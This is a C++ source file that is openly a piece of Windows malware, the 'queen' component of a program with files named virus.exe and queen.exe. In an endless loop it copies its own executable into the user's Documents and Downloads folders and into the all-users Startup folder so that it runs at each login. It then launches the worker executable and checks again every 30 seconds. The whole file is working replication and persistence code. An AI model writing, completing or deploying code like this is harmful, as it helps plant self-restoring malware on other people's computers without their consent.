#include <fstream>
#include <iostream>
#include <vector>
#include <unistd.h> //F_OK and sleep



bool exists (const std::string& name) {
    return ( access( name.c_str(), F_OK ) != -1 );
}

int main() {

  const std::string WORKER_EGG_FILE_NAME = "virus.exe";
  const std::string QUEEN_EGG_FILE_NAME = "queen.exe";
  const std::string QUEEN_INSTILATION_EGG_NAME = "queeenie.exe";
  const std::string USER = std::string(std::getenv("HOMEPATH")).substr((std::string(std::getenv("HOMEPATH") ).rfind("\\") ) + 1, (std::string(std::getenv("HOMEPATH")).length()-1) );
  const std::string WORKER_EXE_FILE_NAME = "virus.exe";

  std::ifstream src;
  std::ofstream dst;

  //the last location will not be reinstalled
  const std::vector<std::string> QUEEN_DEST = { "C:\\Users\\"+USER+"\\Documents\\","C:\\ProgramData\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\StartUp\\","C:\\Users\\"+USER+"\\Downloads\\"};
  const std::vector<std::string> WORKER_DEST = {"C:\\Users\\"+USER+"\\Documents\\","C:\\Users\\"+USER+"\\Downloads\\"};

  char ch; //used for coping files

  for (;;) { //cursed while loop formating
    //finds first executable instance
    bool bb = exists(QUEEN_DEST[QUEEN_DEST.size()-1]+QUEEN_INSTILATION_EGG_NAME);
    int loc_idx = (bb ? QUEEN_DEST.size()-1 : 0);
    while(loc_idx>0 && loc_idx<QUEEN_DEST.size() && !exists(QUEEN_DEST[loc_idx]+QUEEN_EGG_FILE_NAME) ) ++loc_idx;
    if(loc_idx==QUEEN_DEST.size()) {
      std::cout<<"go download queen"<<std::endl;
      //put it in downloads and deciment i
    }

    //duplication of exicutables is unsuccessful if executable is being run at the moment
    for(int j=0; j<QUEEN_DEST.size();j++) {
      if(!exists(QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME)) {
        src.open( QUEEN_DEST[loc_idx]+ (bb && loc_idx == QUEEN_DEST.size()-1? QUEEN_INSTILATION_EGG_NAME : QUEEN_EGG_FILE_NAME ) , std::ios::in | std::ios::binary);
        dst.open(QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME, std::ios::out | std::ios::binary);
        while(src.get(ch)) dst << ch;
        src.close();
        dst.close();
      }
    }
    //this will stall until worker is closed
    std::system((QUEEN_DEST[0]+WORKER_EXE_FILE_NAME).c_str());
    sleep(30); //30 seconds before looping back to determine if worker is running
  }
  return 0;
}
